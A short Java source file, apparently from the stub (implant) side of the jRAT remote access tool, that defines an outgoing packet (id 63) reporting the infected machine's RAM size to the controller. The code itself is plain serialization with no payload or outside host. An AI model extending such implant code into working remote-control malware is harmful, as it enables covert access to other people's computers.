package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet63InitRAM extends AbstractOutgoingPacket {

	private int mbRam;

	public Packet63InitRAM(int mbRam) {
		this.mbRam = mbRam;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(mbRam);
	}

	@Override
	public byte getPacketId() {
		return (byte) 63;
	}
}
